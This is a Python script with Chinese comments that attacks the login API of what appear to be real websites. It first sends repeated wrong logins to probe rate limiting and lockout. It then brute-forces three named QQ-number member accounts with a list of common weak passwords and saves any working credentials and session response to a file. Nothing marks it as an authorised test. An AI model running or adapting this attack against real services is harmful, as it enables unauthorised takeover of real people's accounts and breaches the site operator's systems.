# -*- coding: utf-8 -*-
"""登录接口限速/验证码机制测试 + 已知会员QQ号试探"""

import urllib.request, json, time, sys, ssl

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
out = []


def log(s):
    print(s, flush=True)
    out.append(str(s))


def req(method, path, data=None, headers=None, timeout=12):
    h = {
        "User-Agent": UA,
        "Origin": "https://loiship.com",
        "Referer": "https://loiship.com/",
    }
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h["Content-Type"] = "application/json"
    r = urllib.request.Request(
        "https://api.moegoat.com" + path, data=body, headers=h, method=method
    )
    ctx = ssl.create_default_context()
    try:
        resp = urllib.request.urlopen(r, timeout=timeout, context=ctx)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")[:200]
    except Exception as e:
        return "EXC", type(e).__name__


shard = int(sys.argv[1]) if len(sys.argv) > 1 else 1

# 1. 连续错误登录(测限速/锁定/验证码)
log("=== 限速测试: 连续 15 次错误登录 ===")
for i in range(15):
    st, b = req(
        "POST",
        "/api/user/login",
        {"email": "846851493@qq.com", "password": "WrongPass%d!" % i},
    )
    log("try%d: %s %s" % (i, st, b[:120].replace("\n", " ")))
    if st != 200:
        break
    time.sleep(0.2)
log("--- 限速测试完 ---")

# 2. 已知会员 QQ 号试探(常见弱密码)
log("=== 会员 QQ 号弱密码试探 ===")
targets = ["846851493", "724288338", "641289454"]
pwds = [
    "123456",
    "123456789",
    "qq" + targets[0],
    targets[0],
    "abc123",
    "12345678",
    "woaini",
    "5201314",
    "a123456",
    "111111",
    "qq123456",
    "woaini1314",
    "147258369",
    "zxcvbnm",
    "qwerty",
    "123321",
    "112233",
    "1234567890",
    "666666",
    "888888",
]
for qq in targets:
    for pw in pwds:
        st, b = req(
            "POST", "/api/user/login", {"email": "%s@qq.com" % qq, "password": pw}
        )
        log("login %s/%s: %s %s" % (qq, pw, st, b[:150].replace("\n", " ")))
        if st == 200:
            log(">>>>>>> 爆破成功!!! %s/%s" % (qq, pw))
            with open("BRUTED.txt", "w") as f:
                f.write("%s@qq.com:%s\n%s" % (qq, pw, b[:500]))
            raise SystemExit
        time.sleep(0.3)
        if st == 403:
            log("窗口关")
            raise SystemExit

with open("lb_%d.txt" % shard, "w", encoding="utf-8") as f:
    f.write("\n".join(out))
log("login brute shard%d done" % shard)
